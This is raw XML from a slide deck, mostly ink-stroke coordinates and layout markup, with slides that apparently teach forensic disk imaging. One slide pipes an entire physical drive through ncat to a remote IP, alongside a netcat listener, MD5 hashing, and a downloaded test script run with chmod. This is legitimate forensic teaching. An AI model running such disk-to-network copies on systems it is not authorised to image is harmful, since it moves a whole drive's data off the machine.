0,-1 1 0,1 0 0,17 8 0,23 7 0,-42-14 0,0-1 0,0 1 0,0 1 0,0 0 0,-1 0 0,0 1 0,12 10 0,-10-8 0,0-1 0,0 1 0,0-2 0,19 9 0,-3-4 0,-6-2 0,0-2 0,24 7 0,-31-10 0,0 0 0,0 1 0,0 1 0,12 8 0,25 11 0,-5-3 0,-36-17 0,0 0 0,1-1 0,0 1 0,19 4 0,-19-6 0,1 1 0,-1 0 0,14 6 0,29 12 0,-21-13 0,-2 2 0,1 1 0,-1 2 0,-1 0 0,0 2 0,50 38 0,-70-49 0,-1-1 0,1 0 0,0 0 0,0-1 0,0 0 0,0-1 0,0 0 0,20 2 0,-15-2 0,0 0 0,0 2 0,15 4 0,26 15 0,96 57 0,-130-69 0,1-1 0,31 10 0,-31-12 0,0 0 0,33 19 0,-11-5 0,-32-17 0,-1 1 0,21 12 0,-10-4 0,-1-2 0,2 0 0,0-2 0,37 12 0,0 1 0,-40-15 0,1-1 0,0-1 0,0-1 0,1-1 0,-1-1 0,1-1 0,34 0 0,-31 0 0,0 1 0,0 1 0,-1 1 0,1 1 0,-1 2 0,28 12 0,51 14 0,35-4 0,-68-16 0,93 32 0,-126-34 0,0-2 0,0-2 0,69 7 0,-72-10 0,-1 2 0,37 12 0,-38-10 0,-1-1 0,50 7 0,-47-11 0,56 16 0,4 1 0,-49-13 0,-26-3 0,39 2 0,38 5 0,-63-7 0,38 2 0,-40-5 0,34 6 0,-35-3 0,43 1 0,-45-4 0,41 7 0,-41-4 0,43 1 0,-46-6 0,1 0 0,-1 2 0,38 8 0,-39-6 0,0-1 0,1-1 0,0-1 0,27-3 0,49 3 0,8 20 0,-75-12 0,-1 1 0,0 1 0,0 2 0,59 32 0,-35-16 0,81 50 0,-116-67 0,0-1 0,1 0 0,41 12 0,-47-18 0,-10-3 0,0 0 0,0 0 0,0 1 0,0 0 0,-1 0 0,13 8 0,-14-8-136,0 0-1,0-1 1,1 1-1,-1-1 1,0 0-1,1 0 1,0-1-1,-1 0 0,13 1 1,-1-1-6690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30.814"/>
    </inkml:context>
    <inkml:brush xml:id="br0">
      <inkml:brushProperty name="width" value="0.1" units="cm"/>
      <inkml:brushProperty name="height" value="0.1" units="cm"/>
      <inkml:brushProperty name="color" value="#FFC114"/>
    </inkml:brush>
  </inkml:definitions>
  <inkml:trace contextRef="#ctx0" brushRef="#br0">193 0 24575,'-1'13'0,"1"0"0,1 0 0,0 0 0,1-1 0,0 1 0,1 0 0,1-1 0,0 0 0,0 0 0,1 0 0,1 0 0,0-1 0,0 0 0,10 12 0,35 44 0,-33-44 0,-1 0 0,17 34 0,-9-16 0,-16-27 0,0 1 0,-1 0 0,0 0 0,6 22 0,-13-33 0,0-1 0,0 1 0,0-1 0,0 1 0,-1 0 0,0-1 0,1 1 0,-1 0 0,-1-1 0,1 1 0,0 0 0,-1-1 0,0 1 0,0-1 0,0 1 0,0-1 0,-1 1 0,1-1 0,-1 0 0,0 0 0,0 1 0,0-1 0,0-1 0,-1 1 0,1 0 0,-4 2 0,-18 13 0,-31 19 0,32-23 0,-1 0 0,-1-2 0,0-1 0,-43 13 0,-25 11 0,83-30-36,1 1-1,0 0 0,1 0 0,-1 1 1,1 0-1,-7 8 0,0-1-1071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33.312"/>
    </inkml:context>
    <inkml:brush xml:id="br0">
      <inkml:brushProperty name="width" value="0.1" units="cm"/>
      <inkml:brushProperty name="height" value="0.1" units="cm"/>
      <inkml:brushProperty name="color" value="#FFC114"/>
    </inkml:brush>
  </inkml:definitions>
  <inkml:trace contextRef="#ctx0" brushRef="#br0">1 61 24575,'6'-1'0,"0"0"0,1 0 0,-1-1 0,0 0 0,0 0 0,0 0 0,10-7 0,18-5 0,-17 9 0,1-1 0,0 1 0,36-6 0,-52 11 0,1 0 0,-1 0 0,0 1 0,1-1 0,-1 1 0,0-1 0,1 1 0,-1 0 0,0-1 0,0 1 0,0 0 0,0 1 0,1-1 0,-2 0 0,1 1 0,0-1 0,0 1 0,0-1 0,-1 1 0,1 0 0,-1 0 0,1 0 0,-1 0 0,0 0 0,1 0 0,-1 0 0,0 0 0,-1 0 0,1 0 0,0 1 0,-1-1 0,1 0 0,0 3 0,1 10 0,0 0 0,-1 0 0,0 29 0,-2-36 0,2 52 0,0-37 0,0-1 0,-2 1 0,0-1 0,-2 0 0,-6 26 0,3-30 0,-2 0 0,-9 17 0,-10 24 0,2-6 0,17-38 0,1 0 0,-6 18 0,12-32 0,1 0 0,0 0 0,0 0 0,-1 0 0,1 0 0,0 0 0,0 0 0,0 1 0,0-1 0,0 0 0,0 0 0,1 0 0,-1 0 0,0 0 0,0 0 0,1 0 0,-1 0 0,0 0 0,1 0 0,-1-1 0,1 1 0,0 0 0,-1 0 0,1 0 0,0 0 0,-1-1 0,1 1 0,0 0 0,0-1 0,0 1 0,-1 0 0,1-1 0,0 1 0,0-1 0,0 0 0,0 1 0,0-1 0,2 1 0,4 1 0,1-1 0,0 1 0,0-1 0,11-1 0,4 2 0,11 4-455,1-1 0,56 0 0,-73-5-6371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35.093"/>
    </inkml:context>
    <inkml:brush xml:id="br0">
      <inkml:brushProperty name="width" value="0.1" units="cm"/>
      <inkml:brushProperty name="height" value="0.1" units="cm"/>
      <inkml:brushProperty name="color" value="#FFC114"/>
    </inkml:brush>
  </inkml:definitions>
  <inkml:trace contextRef="#ctx0" brushRef="#br0">482 0 24575,'-7'1'0,"1"-1"0,0 1 0,-1 0 0,1 1 0,0-1 0,0 1 0,0 0 0,0 1 0,1-1 0,-9 6 0,-4 4 0,-29 25 0,-8 6 0,41-33 0,0 0 0,1 2 0,0 0 0,1 0 0,0 1 0,1 0 0,-15 25 0,18-23 0,1-1 0,-9 27 0,-12 25 0,18-49 0,1 0 0,0 1 0,2 0 0,0 0 0,1 1 0,0 0 0,2 0 0,-4 31 0,-2 23 0,5-53 0,-1 39 0,5-35 0,-1 0 0,-8 46 0,5-41 0,1 1 0,2 0 0,1 0 0,5 58 0,-4-82 0,1 0 0,0-1 0,0 1 0,1 0 0,-1-1 0,1 1 0,0-1 0,1 0 0,-1 0 0,1 0 0,0 0 0,0 0 0,7 7 0,-2-4 0,1-1 0,0 0 0,0 0 0,1-1 0,18 9 0,18 14 0,-37-22 0,0-1 0,0 0 0,0-1 0,20 9 0,-11-9 0,-1-1 0,1-1 0,0 0 0,0-2 0,29 0 0,11 1 0,-43 1 0,0-1 0,-1 2 0,1 0 0,-1 1 0,21 10 0,-22-9 0,0-1 0,0 0 0,0-1 0,1 0 0,0-1 0,16 1 0,-14-4 0,0-2 0,0 0 0,0 0 0,-1-2 0,1 0 0,0 0 0,-1-2 0,0 0 0,19-11 0,-23 12 0,1 0 0,-1-1 0,0-1 0,0 0 0,-1 0 0,0-1 0,0 0 0,-1-1 0,0 0 0,8-11 0,2-6 0,-15 21 0,0 0 0,0 0 0,-1 0 0,0 0 0,0 0 0,0-1 0,-1 1 0,3-9 0,1-3 0,2-1 0,0 2 0,0-1 0,2 1 0,0 0 0,12-14 0,20-33 0,-11 17 0,-25 38 0,0 0 0,-1 0 0,0-1 0,0 1 0,0-1 0,-1 0 0,-1 0 0,1-1 0,-2 1 0,1-1 0,-1 0 0,1-11 0,-3-1 0,1 1 0,1-1 0,1 1 0,1-1 0,1 1 0,13-34 0,-10 29 0,-1 0 0,0 0 0,-2-1 0,-1 0 0,-2 0 0,0 0 0,-2-1 0,-6-52 0,5 76 0,0 0 0,0 1 0,0-1 0,0 1 0,-1 0 0,1 0 0,-1-1 0,0 1 0,0 0 0,0 0 0,-1 1 0,1-1 0,-1 0 0,1 1 0,-1-1 0,0 1 0,0 0 0,0 0 0,0 0 0,-6-2 0,-1-1 0,-1 0 0,0 1 0,0 0 0,-1 1 0,-12-2 0,2 0 0,0-1 0,1-2 0,-31-14 0,-3 0 0,-4 2 0,0 2 0,-65-9 0,82 18 0,21 4 0,-1 1 0,1 1 0,-24 0 0,44 3-21,-11 0-248,1 0 0,-1-1 0,1 0 1,-21-5-1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38.393"/>
    </inkml:context>
    <inkml:brush xml:id="br0">
      <inkml:brushProperty name="width" value="0.1" units="cm"/>
      <inkml:brushProperty name="height" value="0.1" units="cm"/>
      <inkml:brushProperty name="color" value="#FFC114"/>
    </inkml:brush>
  </inkml:definitions>
  <inkml:trace contextRef="#ctx0" brushRef="#br0">15209 2042 24575,'-1'-1'0,"1"0"0,0 0 0,-1 0 0,1 0 0,-1 0 0,1 1 0,-1-1 0,0 0 0,1 0 0,-1 0 0,0 1 0,1-1 0,-1 0 0,0 1 0,0-1 0,0 1 0,0-1 0,0 1 0,0-1 0,0 1 0,1-1 0,-1 1 0,0 0 0,0 0 0,0-1 0,-1 1 0,0 0 0,-34-4 0,32 4 0,-349-3 0,181 6 0,147-5 0,-48-8 0,47 6 0,-45-3 0,-65-4 0,-10 0 0,122 11 0,-22 1 0,0-2 0,-77-12 0,94 9 0,0 2 0,-54 1 0,-14-1 0,37-8 0,44 6 0,0 1 0,-23-1 0,-62-7 0,68 6 0,-49-1 0,-766 7 0,823-2 0,-48-9 0,47 5 0,-45-2 0,49 7 0,0-1 0,0-1 0,-29-7 0,25 5 0,-1 1 0,1 1 0,-1 1 0,-28 3 0,-58-3 0,55-10 0,42 8 0,1-1 0,-26 0 0,-46 4 0,50 1 0,0-1 0,-61-9 0,57 3 0,1 3 0,-49 1 0,-26-1 0,7-18 0,70 15 0,-2-1 0,-77-2 0,-1511 10 0,1611-1 0,1 2 0,-29 7 0,27-6 0,0 1 0,-20 0 0,-27-4 0,25 0 0,0 2 0,-54 8 0,-67 12 0,138-18 0,0-1 0,-1-1 0,-42-3 0,-27 2 0,34 10 0,43-8 0,1 1 0,-26 0 0,6-2 0,-1 2 0,1 2 0,-63 17 0,12-8 0,67-13 0,1 1 0,1 0 0,-1 1 0,0 1 0,-23 10 0,-9 7 0,-64 19 0,16-7 0,36-11 0,0-4 0,-86 16 0,81-25 0,-83 15 0,116-19 0,-44 4 0,-6 0 0,-198 37 0,233-38 0,-70 23 0,28-6 0,45-14 0,12-3 0,-1 0 0,0-3 0,-55 4 0,74-8 0,1-1 0,-23 7 0,-24 2 0,-9 1 0,53-7 0,-1 0 0,-24 0 0,-127 9 0,52-3 0,19-1-57,-60 3-1025,135-11 1049,-44 8 0,-11 1 46,-452-7 879,272-6-592,222 3-300,1-1 0,-57-11 0,-71-10 0,59 13 0,65 7 0,-41-8 0,48 4 0,-11-3 0,1 2 0,-76-3 0,92 8 0,-1 0 0,1-3 0,-49-13 0,16 4 0,48 10 0,1 0 0,0 0 0,1-1 0,-1-1 0,1 1 0,0-2 0,0 0 0,1 0 0,-11-11 0,6 7 0,0 0 0,0 1 0,-17-9 0,-26-5 0,46 20 0,-1 0 0,1 0 0,1-1 0,-1-1 0,1 0 0,0 0 0,0-1 0,-15-13 0,3-1 0,0 1 0,-1 2 0,-1 0 0,-1 2 0,-29-15 0,43 24 0,0-1 0,1-1 0,0 0 0,0 0 0,-8-11 0,8 9 0,0 0 0,-1 1 0,-23-17 0,30 23 0,0 1 0,0-1 0,1 0 0,-1 0 0,1-1 0,0 1 0,0-1 0,0 0 0,1 1 0,-1-1 0,1 0 0,-2-10 0,1 8 0,0-1 0,0 1 0,-1 0 0,1 0 0,-10-13 0,-75-88 0,58 69 0,24 31 0,1 1 0,-1-1 0,-1 1 0,1 0 0,-11-8 0,10 9 0,1-1 0,0 1 0,0-1 0,1 0 0,-1 0 0,2-1 0,-1 1 0,-4-12 0,-18-27 0,21 38 0,1-1 0,1 0 0,-1-1 0,1 1 0,1-1 0,0 0 0,0 0 0,-2-19 0,-4-15 0,6 36 0,0 0 0,0 0 0,-1 1 0,0-1 0,-1 1 0,-6-8 0,5 7 0,1-1 0,-1 0 0,-7-18 0,-30-79 0,-13-11 0,49 104 0,0 0 0,-1 1 0,-16-19 0,-2-5 0,4 0 0,2 0 0,-18-48 0,28 64 0,-1 0 0,-26-33 0,27 42 0,0 0 0,0 2 0,-1-1 0,-14-9 0,-7-6 0,-88-95 0,22 22 0,87 89 0,-1 1 0,0 0 0,0 1 0,-1 0 0,1 1 0,-2 1 0,-16-5 0,9 2 0,1 0 0,-20-11 0,-28-23 0,34 20 0,0 2 0,-47-20 0,63 33 0,0 1 0,0 1 0,-1 0 0,-18-2 0,-67-12 0,70 11 0,-1 2 0,0 1 0,-38 0 0,-509 6 0,559 1 0,0 0 0,0 2 0,1 0 0,-1 2 0,-39 15 0,7-3 0,30-12 0,21-6 0,0 1 0,1-1 0,-1 1 0,0 0 0,1 0 0,-1 0 0,0 0 0,1 1 0,0-1 0,-1 1 0,1 0 0,0 0 0,0 0 0,0 0 0,0 1 0,-4 4 0,6-4-1365</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39.807"/>
    </inkml:context>
    <inkml:brush xml:id="br0">
      <inkml:brushProperty name="width" value="0.1" units="cm"/>
      <inkml:brushProperty name="height" value="0.1" units="cm"/>
      <inkml:brushProperty name="color" value="#FFC114"/>
    </inkml:brush>
  </inkml:definitions>
  <inkml:trace contextRef="#ctx0" brushRef="#br0">343 0 24575,'-3'2'0,"1"0"0,-1 0 0,1 0 0,-1 0 0,1 0 0,0 0 0,0 1 0,0-1 0,0 1 0,0-1 0,1 1 0,-3 4 0,-4 5 0,-87 88 0,59-65 0,-13 23 0,31-35 0,-28 49 0,15-23 0,27-43 0,1 0 0,-1 0 0,1 0 0,0 0 0,0 0 0,1 1 0,0-1 0,0 1 0,-2 11 0,4-14 0,0 0 0,1 0 0,-1 0 0,1 0 0,0 0 0,0 0 0,0 0 0,0-1 0,1 1 0,0 0 0,0-1 0,0 1 0,0-1 0,0 0 0,0 1 0,1-1 0,6 5 0,5 7 0,1-1 0,27 21 0,-35-30 0,1 0 0,0-1 0,0 0 0,1 0 0,-1-1 0,1 0 0,0 0 0,13 1 0,-15-3-80,0 0 0,0 0-1,0 1 1,0 0 0,0 0-1,0 1 1,0 0 0,-1 0-1,0 1 1,1-1 0,-1 1 0,0 1-1,-1-1 1,1 1 0,-1 0-1,8 9 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43.487"/>
    </inkml:context>
    <inkml:brush xml:id="br0">
      <inkml:brushProperty name="width" value="0.1" units="cm"/>
      <inkml:brushProperty name="height" value="0.1" units="cm"/>
      <inkml:brushProperty name="color" value="#FFC114"/>
    </inkml:brush>
  </inkml:definitions>
  <inkml:trace contextRef="#ctx0" brushRef="#br0">1 19 24575,'45'-16'0,"-43"15"0,1 1 0,-1-1 0,0 1 0,0 0 0,0 0 0,0 0 0,0 0 0,1 0 0,-1 0 0,0 0 0,0 1 0,0-1 0,0 1 0,0 0 0,0 0 0,0-1 0,0 1 0,0 0 0,0 1 0,0-1 0,-1 0 0,1 1 0,0-1 0,-1 0 0,1 1 0,-1 0 0,1-1 0,-1 1 0,0 0 0,0 0 0,0 0 0,0 0 0,0 0 0,0 0 0,-1 0 0,1 0 0,-1 0 0,1 3 0,1 9 0,0 1 0,-1 0 0,-1 0 0,-3 25 0,2-12 0,1 34 0,2-44 0,-2-1 0,0 0 0,-1 0 0,0 1 0,-2-1 0,0 0 0,0 0 0,-10 23 0,35-50 0,-9 4 0,-1-1 0,1 2 0,0-1 0,22-4 0,7 6 0,0 3 0,69 6 0,-109-5 0,0 0 0,0 0 0,0 1 0,0-1 0,0 1 0,0 0 0,0-1 0,0 1 0,0 0 0,0 0 0,-1 0 0,1 0 0,0 1 0,-1-1 0,1 0 0,-1 1 0,1-1 0,-1 1 0,0-1 0,1 1 0,0 2 0,0 0 0,-1 0 0,1 0 0,-1 0 0,0 0 0,0 0 0,0 0 0,-1 1 0,1-1 0,-1 0 0,0 5 0,-1 2 0,0 0 0,-1 0 0,0 0 0,-1-1 0,0 1 0,-1-1 0,-7 15 0,-21 29 0,21-37 0,0 0 0,2 0 0,-14 32 0,22-44-114,-1-1 1,0 0-1,0 0 0,-1 0 0,0-1 1,1 1-1,-1 0 0,0-1 0,0 0 1,-1 0-1,-5 5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46.386"/>
    </inkml:context>
    <inkml:brush xml:id="br0">
      <inkml:brushProperty name="width" value="0.1" units="cm"/>
      <inkml:brushProperty name="height" value="0.1" units="cm"/>
      <inkml:brushProperty name="color" value="#FFC114"/>
    </inkml:brush>
  </inkml:definitions>
  <inkml:trace contextRef="#ctx0" brushRef="#br0">501 1 24575,'-3'0'0,"-14"0"0,0 0 0,0 0 0,0 2 0,1 0 0,-1 1 0,0 0 0,-19 8 0,3 2 0,14-7 0,1 1 0,0 1 0,0 1 0,1 0 0,0 1 0,1 1 0,-25 21 0,34-25 0,-1 1 0,1 0 0,0 1 0,1-1 0,-1 1 0,2 1 0,0-1 0,0 1 0,0 0 0,1 0 0,1 0 0,0 1 0,0-1 0,1 1 0,0 0 0,0 17 0,-12 80 0,7-64 0,-3 5 0,6-31 0,1-1 0,-2 30 0,4-28 0,-9 37 0,6-36 0,-2 37 0,5-31 0,3 165 0,-1-183 0,1 0 0,0 0 0,0-1 0,1 1 0,0-1 0,6 11 0,10 28 0,-15-34 0,1 1 0,0-1 0,1 0 0,0 0 0,1-1 0,9 13 0,56 63 0,-38-47 0,-26-33 0,0 1 0,1-1 0,-1-1 0,1 0 0,0 0 0,1-1 0,0 0 0,17 7 0,21 10 0,-25-10 0,23 15 0,-41-23 0,1-1 0,-1-1 0,1 1 0,0-1 0,0 0 0,0 0 0,0-1 0,0 1 0,0-1 0,9 0 0,4 0 0,0-1 0,21-3 0,-34 2 0,-1 0 0,1-1 0,0 0 0,0 0 0,-1-1 0,0 1 0,1-1 0,-1-1 0,0 1 0,0-1 0,-1 1 0,1-1 0,5-6 0,27-20 0,-23 18 0,0 0 0,-1-1 0,0 0 0,-1-1 0,-1 0 0,0-1 0,16-30 0,-13 21 0,-4 10 0,-1 0 0,-1-1 0,-1 0 0,0 0 0,-1-1 0,7-28 0,-6 11 0,-1 0 0,-1 0 0,-1-43 0,-3 28 0,1 28 0,-2 0 0,0 0 0,-2 0 0,-4-22 0,3 32 0,-1 0 0,0 0 0,-1 1 0,0 0 0,-12-17 0,10 16 0,1 0 0,0 0 0,0-1 0,-5-16 0,-6-23 0,-17-67 0,32 110 0,-1-8 0,-1 0 0,-9-25 0,12 36 0,-1 1 0,0-1 0,0 1 0,0-1 0,0 1 0,-1 0 0,1 0 0,-1 0 0,1 0 0,-1 1 0,0-1 0,0 1 0,-1-1 0,1 1 0,-6-3 0,-3 0-136,1 0-1,1-1 1,-1 0-1,1-1 1,0 0-1,0-1 1,1 0-1,0 0 0,-11-14 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58.901"/>
    </inkml:context>
    <inkml:brush xml:id="br0">
      <inkml:brushProperty name="width" value="0.1" units="cm"/>
      <inkml:brushProperty name="height" value="0.1" units="cm"/>
      <inkml:brushProperty name="color" value="#FFC114"/>
    </inkml:brush>
  </inkml:definitions>
  <inkml:trace contextRef="#ctx0" brushRef="#br0">1 4 24575,'0'-3'0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7:59.364"/>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8-30T14:28:00.165"/>
    </inkml:context>
    <inkml:brush xml:id="br0">
      <inkml:brushProperty name="width" value="0.1" units="cm"/>
      <inkml:brushProperty name="height" value="0.1" units="cm"/>
      <inkml:brushProperty name="color" value="#FFC11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58D5F-65FB-4E17-9D5B-8CF1DE5A98DF}" type="datetimeFigureOut">
              <a:rPr lang="en-US" smtClean="0"/>
              <a:t>8/24/2025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49544B-F866-4ED0-8997-24601187AE87}" type="slidenum">
              <a:rPr lang="en-US" smtClean="0"/>
              <a:t>‹#›</a:t>
            </a:fld>
            <a:endParaRPr lang="en-US"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="1595199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nc</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0"/>
              <a:t> -</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0" err="1"/>
              <a:t>lp</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0"/>
              <a:t> 8080 &gt; win.dd</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30</a:t>
            </a:fld>
            <a:endParaRPr lang="en-US"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="2288668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\\.\Volume{6d634efd-0000-0000-0000-501f00000000}</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>\\?\Device\Harddisk0\Partition0</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="4" name="Slide Number Placeholder 3"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="sldNum" sz="quarter" idx="5"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:fld id="{8349544B-F866-4ED0-8997-24601187AE87}" type="slidenum">
              <a:rPr lang="en-US" smtClean="0"/>
              <a:t>31</a:t>
            </a:fld>
            <a:endParaRPr lang="en-US"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="2951655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dd bs=16M if=\\.\PhysicalDrive0 --progress | </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0" err="1"/>
              <a:t>ncat</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0"/>
              <a:t> 136.160.215.16 8080</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:endParaRPr lang="en-GB" dirty="0"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-GB" dirty="0" err="1"/>
              <a:t>certutil</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0"/>
              <a:t> -</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0" err="1"/>
              <a:t>hashfile</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0" err="1"/>
              <a:t>xxxx</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0"/>
              <a:t> md5</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34</a:t>
            </a:fld>
            <a:endParaRPr lang="en-US"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="10731632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dirty="0"/>
              <a:t>wget https://raw.githubusercontent.com/tdg5/blog/master/_includes/scripts/dd_obs_test.sh</a:t>
            </a:r>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36</a:t>
            </a:fld>
            <a:endParaRPr lang="en-US"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="246565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chmod</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> +x dd_obs_test.sh</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="4" name="Slide Number Placeholder 3"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="sldNum" sz="quarter" idx="5"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:fld id="{8349544B-F866-4ED0-8997-24601187AE87}" type="slidenum">
              <a:rPr lang="en-US" smtClean="0"/>
              <a:t>37</a:t>
            </a:fld>
            <a:endParaRPr lang="en-US"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="2795955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./dd_obs_test.sh</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="4" name="Slide Number Placeholder 3"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="sldNum" sz="quarter" idx="5"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:fld id="{8349544B-F866-4ED0-8997-24601187AE87}" type="slidenum">
              <a:rPr lang="en-US" smtClean="0"/>
              <a:t>38</a:t>
            </a:fld>
            <a:endParaRPr lang="en-US"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="1021403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dirty="0"/>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8/24/2025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8/24/2025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8/24/2025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92"/>
        <p:cNvGrpSpPr/>
        <p:nvPr/>
      </p:nvGrpSpPr>
      <p:grpSpPr>
        <a:xfrm>
          <a:off x="0" y="0"/>
          <a:ext cx="0" cy="0"/>
          <a:chOff x="0" y="0"/>
          <a:chExt cx="0" cy="0"/>
        </a:xfrm>
      </p:grpSpPr>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="193" name="Google Shape;193;p3"/>
          <p:cNvSpPr txBox="1">
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="ctrTitle"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="4281247" y="2215683"/>
            <a:ext cx="7068800" cy="1546400"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
        <p:txBody>
          <a:bodyPr spcFirstLastPara="1" wrap="square" lIns="91425" tIns="91425" rIns="91425" bIns="91425" anchor="b" anchorCtr="0"/>
          <a:lstStyle>
            <a:lvl1pPr lvl="0" algn="r" rtl="0">
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buSzPts val="3700"/>
              <a:buNone/>
              <a:defRPr sz="4933" b="0"/>
            </a:lvl1pPr>
            <a:lvl2pPr lvl="1" algn="r" rtl="0">
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buSzPts val="3700"/>
              <a:buNone/>
              <a:defRPr sz="4933" b="0"/>
            </a:lvl2pPr>
            <a:lvl3pPr lvl="2" algn="r" rtl="0">
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buSzPts val="3700"/>
              <a:buNone/>
              <a:defRPr sz="4933" b="0"/>
            </a:lvl3pPr>
            <a:lvl4pPr lvl="3" algn="r" rtl="0">
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buSzPts val="3700"/>
              <a:buNone/>
              <a:defRPr sz="4933" b="0"/>
            </a:lvl4pPr>
            <a:lvl5pPr lvl="4" algn="r" rtl="0">
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buSzPts val="3700"/>
              <a:buNone/>
              <a:defRPr sz="4933" b="0"/>
            </a:lvl5pPr>
            <a:lvl6pPr lvl="5" algn="r" rtl="0">
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buSzPts val="3700"/>
              <a:buNone/>
              <a:defRPr sz="4933" b="0"/>
            </a:lvl6pPr>
            <a:lvl7pPr lvl="6" algn="r" rtl="0">
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buSzPts val="3700"/>
              <a:buNone/>
              <a:defRPr sz="4933" b="0"/>
            </a:lvl7pPr>
            <a:lvl8pPr lvl="7" algn="r" rtl="0">
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buSzPts val="3700"/>
              <a:buNone/>
              <a:defRPr sz="4933" b="0"/>
            </a:lvl8pPr>
            <a:lvl9pPr lvl="8" algn="r" rtl="0">
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buSzPts val="3700"/>
              <a:buNone/>
              <a:defRPr sz="4933" b="0"/>
            </a:lvl9pPr>
          </a:lstStyle>
          <a:p>
            <a:endParaRPr/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="194" name="Google Shape;194;p3"/>
          <p:cNvSpPr txBox="1">
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
